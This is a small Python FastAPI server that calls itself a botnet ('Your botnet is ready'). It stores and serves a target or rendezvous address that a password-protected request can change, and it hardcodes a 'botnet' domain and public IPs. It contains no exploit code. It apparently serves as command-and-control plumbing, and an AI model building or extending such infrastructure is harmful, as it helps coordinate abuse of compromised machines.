from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel
import json
from typing import Optional


with open('credentials.json', 'r') as file:
    credentials = json.load(file)

API_PASS = credentials["API_pass"]


app = FastAPI()
address: Optional[str] = None
allowed_ips = {"ai-poly.online", "botnet.ai-poly.online", "109.71.242.119", "127.0.0.1", "localhost", "185.236.22.145"}


class AddressRequest(BaseModel):
    address: str
    api_pass: str


@app.get("/")
async def root():
    return {"message": "Your botnet is ready"}


@app.get("/address", response_model=str)
async def get_address():
    if address:
        return address
    else:
        raise HTTPException(status_code=404, detail="Address not set")


@app.post("/address", response_model=str)
async def set_address(address_req: AddressRequest, request: Request):
    if address_req.api_pass != API_PASS:
        raise HTTPException(status_code=403, detail="Access denied")
    
    global address
    address = address_req.address
    return address
